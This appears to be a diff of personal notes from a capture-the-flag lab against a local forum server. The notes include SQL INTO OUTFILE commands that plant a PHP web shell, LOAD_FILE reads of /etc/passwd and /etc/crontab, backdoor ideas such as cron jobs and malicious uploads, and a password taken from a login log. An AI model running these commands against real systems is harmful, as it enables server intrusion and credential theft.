@@ -34,14 +34,16 @@ https://localhost:13443/forum/index.php?mode=js_defaults&t=1707434027&user_type=
 wtf is that?
 https://localhost:13443/forum/modules/bad-behavior/index.html
 https://localhost:13443/forum/modules/bad-behavior/bad-behavior/banned.inc.php
+<?php if (!defined('BB2_CORE')) die('I said no cheating!');
 
 https://localhost:13443/forum/index.php?mode=admin&action=edit_page PHP backdoor here?
 Add backdoor to cron
 Try uploading php files instead of profile pictures for backdoor
 
-Insert backdoor.php using SQL (these commands don't work)
-SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/mycustomphpinfo.php'
-SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'
+Insert backdoor.php using SQL
+SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/backdoor.php' (works)
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/backdoor.php' (Error 13)
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/backdoor.php' (Error 13)
 https://localhost:13443/backdoor.php?cmd=whoami
 Maybe here? https://localhost:13443/forum/images/uploaded/ (doesn't seem to work either)
 Add a user to /etc/passwd using SQL
@@ -85,6 +87,8 @@ Read https://localhost:13443/forum/index.php?id=6
 Someone tried to connect with username !q\]Ej?*5K5cy*AJ, lmezard logged in right after
 This is her password for both the forum and webmail
 
+All mails are forwarded to ft_root@mail.borntosec.net
+
 We connect to webmail and find a mail with subject "DB Access" with the root credentials
 We connect to phpmyadmin.
 We change all passwords for forum to be the same as lmezard
@@ -92,6 +96,7 @@ We change all passwords for phpmyadmin to be the same as root
 
 Visit https://localhost:13443/forum/index.php?mode=admin&action=backup as admin and create complete backup
 
-SELECT CONVERT(LOAD_FILE('/etc/crontab') USING utf8);
-SELECT CONVERT(LOAD_FILE('/etc/passwd') USING utf8);
+SELECT CONVERT(LOAD_FILE('/etc/crontab') USING utf8)
+SELECT CONVERT(LOAD_FILE('/etc/passwd') USING utf8)
+SELECT CONVERT(LOAD_FILE('/var/www/forum/index.php') USING utf8)
 Print view (with full texts)
